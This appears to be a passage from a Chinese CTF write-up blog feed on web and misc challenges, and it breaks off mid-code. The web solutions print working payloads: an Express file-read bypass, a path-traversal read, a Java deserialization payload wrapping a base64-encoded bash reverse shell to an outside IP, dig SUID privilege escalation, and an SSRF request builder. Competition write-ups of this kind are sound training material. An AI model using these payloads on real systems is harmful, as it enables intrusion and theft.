java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">flag</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            input = Files.newInputStream(Paths.get(<span class="hljs-string">&quot;/tmp/config.properties&quot;</span>));<br>            <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>                <span class="hljs-comment">// 连接到SQLite数据库</span><br>                <span class="hljs-comment">// 创建一个属性对象</span><br>                prop.load(input);<br><br>                <span class="hljs-comment">// 创建一个Connection对象，并传入属性对象</span><br>                conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite:/tmp/mydatabase.db&quot;</span>, prop);<br>                <span class="hljs-comment">// 设置密码</span><br>                <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>                stmt.close();<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>            &#125;<br>            <span class="hljs-comment">// 接下来，你可以在此处执行其他操作</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            System.out.println(e.getMessage());<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) &#123;<br>                    conn.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>                System.out.println(ex.getMessage());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动文件（/root/start.sh）如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>FLAG_PATH=/tmp/config.properties<br>FLAG_MODE=M_SED<br>if [ $&#123;ICQ_FLAG&#125; ];then<br>    case $FLAG_MODE in<br>        &quot;M_ECHO&quot;)<br>            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;<br>            FILE_MODE=755 <br>            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SED&quot;)<br>            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SQL&quot;)<br>            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;<br>            ;;<br>        *)<br>            ;;<br>    esac<br>    echo [+] ICQ_FLAG OK   <br>    unset ICQ_FLAG <br>else<br>    echo [!] no ICQ_FLAG<br>fi<br><br>unset ICQ_FLAG<br>rm -rf /etc/profile.d/pouchenv.sh<br>rm -rf /etc/instanceInfo<br>rm -rf /start.sh<br><br>/usr/sbin/nginx<br><br>/usr/sbin/crond<br><br>/usr/sbin/rsyslogd<br><br>javac /root/flag.java<br>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;<br><br>nohup java -jar /root/upload.jar &gt;/dev/null &amp;<br>sleep 1;<br><br>rm /tmp/config.properties<br><br>java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;<br>exec tail -f /dev/null<br></code></pre></td></tr></table></figure></blockquote><h3 id="参考">参考</h3><p>https://www.xx5xx.top/Writeup/WEB/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-sharedBox/</p><p>https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</p><p>https://www.cnblogs.com/xbbth/p/17446987.html</p><p>https://github.com/kekingcn/kkFileView/issues/128</p><h1 id="misc">MISC</h1><h2 id="pintu">PINTU</h2><p>图片像素rgb值转2进制再转成字符串发现提示</p><p>然后图片高度隐写，8进制转10进制再转成ascii，发现是每两个字符为一组（因为中间有空格分隔）</p><p>再转一次ascii码，得到一串字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-comment">#img_width = 65 # 所有图片的统一宽度</span><br>img_num = <span class="hljs-number">4703</span> <span class="hljs-comment"># 图片总数</span><br>num = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment">#图片像素转二进制</span><br>heigth_list = [] <span class="hljs-comment">#高度list</span><br>ten_chr = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#高度转10进制</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, img_num+<span class="hljs-number">1</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;pintu/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>) <span class="hljs-comment"># 打开图片</span><br>    <span class="hljs-comment">#像素rgb转二进制</span><br>    pixel = img.getpixel((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment">#print(pixel)</span><br>    <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">0</span>:<br>        num += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        num += <span class="hljs-string">&#x27;1&#x27;</span><br>    <br>    heigth_list.append(img.height)<br>    <br>num = <span class="hljs-built_in">int</span>(num,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(num).decode())<br><span class="hljs-string">&#x27;&#x27;&#x27;flag看到666c是不是特别兴奋，很可惜flag并不在这。（狗头保命），既然走到了这里，那我也给一个通关的关键信息拿去吧，去找到真正的flag吧：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W                        </span><br><span class="hljs-string">         哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="hljs-string">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> heigth_list:<br>    ten_chr += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">8</span>))  <span class="hljs-comment">#8转10转ascii</span><br><span class="hljs-comment">#print(heigth_list)</span><br><span class="hljs-built_in">print</span>(ten_chr)<br><br>data = ten_chr.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#print(data)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(data[i]))<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#JRFTC5SFG5SU4STVHBTTCR2SKVSE2NKVIUYFCS2MOVFUWMLLGVKWITKLJZSE2NKVMRFUWY3EJU3VKZCNGVKU2SKQMNXE2WCVMRGTKVKNMM2XMRKLGE2US5SEOFWTMRDRNZVTO5LNGZCGYWDVOVYUG5KYKVWTMRDRMRBG4ZDNGZJE4TLWIRYWITJVOVWTMUSOMRGXK4LONM2VK3JWIRWGITJVMRWTMUSVJV3FEVLEJU2XKZCCNZKWITJVJZSE2NKVNZVTOVLEJU2VCWDVGVKUKTLEOFWTMRDMMRGTKVKYOU3XIRJWKJKGITJVKVSGEODQNJ2UWWCLGB2WWTDCOU3EWQRQJRCXKWDFMRBDINLJGVXEUSRPMFEUW5TYOFFEEWCTORGVQSBRNNJHKS2HKRDXIVSSOVEXE5JWNJGWCWCLIJIXATBXNZVUYQRROVIVMMDNORFWKR2JOJFU2S2JGBLEKTKQOFGU4UKGJN2FEUCNKY2EQQKOKVFU2TJVLBXESS3NMQXVMNZZKY2UQTJPMVSU2S2RINUXKMLVKFCW64KLJMZXO2JVJNEGI6JQO5GDKVJWOQ3TAMSLJVFFU2SNGAYW4Y2YMFGWWUSINJ2WY53EGA4WYTJWHB4GSZ2LJI4WENDWJQ3TKTBTG5LE45DHJNSUULZVOBFFMMJSJN2U2NSRM4YTSOKWMEZEYN3BOQ4UKZLDNFGVQ4SNJNIUUOJXNZ3FC23OOJFXONLZKFETQMTOI43VGSKNKBKTCVSQINUWENCLGFDWCYTJJU2GISLHGR3TG4SRIMZUES2YNZDTAMDUJUYEKTJQGV4ES6JRNVFWGMCUJI3XKN2NKZ4E45CHGB2DGYTBKFMHS33XIVHGK6KFO4YTCQ2CGRZG4VSYIFIWE6DXINZEW4BTI5QUC2LSG5LESVTOIF2E4YKTGM3TIVCKMIYTE3KHJMXXIY3PI52EK3TVNFZEWYKNO5LGW2SCKZYEK5ZUNQZXKODXLBCW4MJRKZFVAZCLKM3DSYRYKBXE4NCIJJVTE4KFKZITA2KJMR3UWQRUMFUWENDWJJHFCNDNNNJFGMZXMEXXIYTBKBIU2ZJPJIXVCSKYOI2HU5DHKM3USRJZOFGS642OGFDVQU3JGAYUW2TXGRAUS5KEKBXE2222JRTTG4BRIU2TMOKNGJ3UCTRVIZVESWCNNZRUWVSLJU2EM5COJM3VC5ZRMRXDA3ZXNFCTKWCKJZIWMMLDGREWUQTPJZUXSMBXNFTVQSCLIIZVI2TCNRIEK22LGZEWEUTMJU2WCZJZJV4FU2SJMVDFQVRXGFFGWUBYJJZG46CYGUYHSWBPGU4EWYRQJFVGEMLLNVVTS4KNOQ4DKSSHLAYDGRJVNBFUSNKFNZHDI2CFOU3U2M2NMFWUGSKSMFMGWN2WGM3TAOBTF42EEZDCHFWFQTLMOAZUWVJUNFBDSTSLMNJXATBWKI3FQYZRGZXGWODCGNDTSNZRKZJDQZCNGVKWITJVGVVHKMKNJQ3VCN2NJE3WGZBWONXTC4RVNM4UKYLBNJETKLZRORJFU2TCGNMTSYRVO4YUKOLL</span><br></code></pre></td></tr></table></figure><p>base32-&gt;base64换表-&gt;base64</p><figure><img src="/img/2023香山杯/169795243493423.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到一张rgb很混乱的图片，Piet隐写</p><p>用工具npiet</p><p>下载：https://www.bertnase.de/npiet/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">npiet.exe -tpic download.png <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="柏鹭杯">2023柏鹭杯</h1><h1 id="web">WEB</h1><h2 id="express-fs">express fs</h2><p>参考：https://www.cnblogs.com/91ac0m0/p/17557039.html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">?file[protocol]=file:&amp;file[href]=a&amp;file[pathname]=fl%2561g.txt&amp;file[hostname]=&amp;file[origin]=x<br></code></pre></td></tr></table></figure><h2 id="综合题5">综合题5</h2><p>源码中有<code>/readfile?filename=</code></p><p>目录穿越读文件<code>/../../../../../app/demo.jar</code></p><p>拿到源码</p><p>Upload.class，upload类中有混淆加密的flag1</p><figure><img src="/img/2023柏鹭杯/16976293252215.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>逆向一下得到flag1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseUpload</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">O0O</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ReverseUpload</span> <span class="hljs-variable">uploader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReverseUpload</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalEncFlag1</span> <span class="hljs-operator">=</span> uploader.decryptEncFlag1();<br>        System.out.println(<span class="hljs-string">&quot;Original enc_flag1: &quot;</span> + originalEncFlag1);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decryptEncFlag1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncodedFlag1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64EncodedFlag1);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes);<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedFlag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; decodedString.length(); i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">originalChar</span> <span class="hljs-operator">=</span> decodedString.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">oOO</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.O0O.charAt(i % <span class="hljs-built_in">this</span>.O0O.length());<br>            <span class="hljs-type">char</span> <span class="hljs-variable">encryptedChar</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>) (originalChar ^ oOO);<br>            decryptedFlag.append(encryptedChar);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> decryptedFlag.toString();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Original enc_flag1: flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></code></pre></td></tr></table></figure><h2 id="综合题6"><strong>综合题</strong>6</h2><p>源码中Ping.class是一个恶意类，readObject反序列化，exec可以命令执行</p><figure><img src="/img/2023柏鹭杯/16976293252171.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>通过Upload类的<code>/internalApi/v3.2/updateConfig</code>此路由可以反序列化加载恶意类Ping进行命令执行</p><figure><img src="/img/2023柏鹭杯/16976293252172.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Ser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// Create a Ping object</span><br>        <span class="hljs-type">Ping</span> <span class="hljs-variable">ping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ping</span>();<br>        ping.setCommand(<span class="hljs-string">&quot;bash&quot;</span>);<br>        ping.setArg1(<span class="hljs-string">&quot;-c&quot;</span>);<br>        ping.setArg2(<span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEyLjI1MS42Mi80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);<br><br>        <span class="hljs-comment">// Serialize the Ping object to a byte array</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(ping);<br><br>        <span class="hljs-comment">// Encode the byte array to Base64</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>        System.out.println(<span class="hljs-string">&quot;Payload: &quot;</span> + payload);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Payload: rO0ABXNyABVjb20uZXhhbXBsZS5kZW1vLlBpbmcAAAAAAAAAAQIAA0wABGFyZzF0ABJMamF2YS9sYW5nL1N0cmluZztMAARhcmcycQB+AAFMAAdjb21tYW5kcQB+AAF4cHQAAi1jdABfYmFzaCAtYyAne2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRXlMakkxTVM0Mk1pODBOVFkzSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSd0AARiYXNo</span><br></code></pre></td></tr></table></figure><p>反弹shell</p><figure><img src="/img/2023柏鹭杯/16976293252183.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>find找suid，dig提权，<code>/usr/bin/dig -f /root/flag2</code></p><figure><img src="/img/2023柏鹭杯/16976293252184.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="综合题7">综合题7</h2><p>这题当时差一点时间没打出来，当时上传了msf马到服务器上搭好了隧道redis写了ssh的公钥</p><p>赛后看了很多师傅的wp，都是用frp代理进去，写公钥后连上去即可</p><p>具体参考</p><p><ahref="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">星盟</a><ahref="https://www.cnblogs.com/V3g3t4ble/p/17757854.html">V3g3t4ble</a><ahref="https://fushuling.com/index.php/2023/10/12/2023%e7%bd%91%e4%bf%a1%e6%9f%8f%e9%b9%ad%e6%9d%af%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e5%ae%89%e5%85%a8%e7%b2%be%e8%8b%b1%e8%b5%9b/">fushulingのblog</a></p><h1 id="misc">MISC</h1><h2 id="签到">签到</h2><p>每一行的空格数量为flag的ascii，转一下得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">x = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;qd.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    aa = f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aa:<br>        x += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">#flag&#123;ISEC-eF8x2Bv1viw9eFvagivx0Ynv3jlai0vL&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2nd</title>
    <link href="/2023/09/18/NSSCTF%202nd/"/>
    <url>/2023/09/18/NSSCTF%202nd/</url>
    
    <content type="html"><![CDATA[<h1 id="nssctf-2nd">NSSCTF 2nd</h1><h1 id="web">WEB</h1><h2 id="myboxrevenge">MyBox(revenge)</h2><p>给了一个url的参数，可以利用file读文件</p><p><code>?url=file:///etc/passwd</code></p><figure><img src="/img/NSSCTF%202nd/17006210687199.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ban了<code>/proc/1/environ</code>，<code>/start.sh</code>等非预期</p><p>读<code>/app/app.py</code>拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Plain">from flask import Flask, request, redirect<br>import requests, socket, struct<br>from urllib import parse<br>app = Flask(__name__)<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    if not request.args.get(&#x27;url&#x27;):<br>        return redirect(&#x27;/?url=dosth&#x27;)<br>    url = request.args.get(&#x27;url&#x27;)<br>    if url.startswith(&#x27;file://&#x27;):<br>        if &#x27;proc&#x27; in url or &#x27;flag&#x27; in url:<br>            return &#x27;no!&#x27;<br>        with open(url[7:], &#x27;r&#x27;) as f:<br>            data = f.read()<br>            if url[7:] == &#x27;/app/app.py&#x27;:<br>                return data<br>            if &#x27;NSSCTF&#x27; in data:<br>                return &#x27;no!&#x27;<br>            return data<br>    elif url.startswith(&#x27;http://localhost/&#x27;):<br>        return requests.get(url).text<br>    elif url.startswith(&#x27;mybox://127.0.0.1:&#x27;):<br>        port, cont    ent = url[18:].split(&#x27;/_&#x27;, maxsplit=1)<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(5)<br>        s.connect((&#x27;127.0.0.1&#x27;, int(port)))<br>        s.send(parse.unquote(content).encode())<br>        res = b&#x27;&#x27;<br>        while 1:<br>            data = s.recv(1024)<br>            if data:<br>                res += data<br>            else:<br>                break<br>        return res<br>    return &#x27;&#x27;<br><br>app.run(&#x27;0.0.0.0&#x27;, 827)<br></code></pre></td></tr></table></figure><p>重点看23行<code>elif url.startswith('mybox://127.0.0.1:'):</code>，建立了一个到127.0.0.1上的指定端口（827）的TCP的socket通信</p><p>相当于一个gopher协议的替换，即把gopher://127.0.0.1改成mybox://127.0.01</p><p>然后目的很明显了，gopher打ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /flag HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span 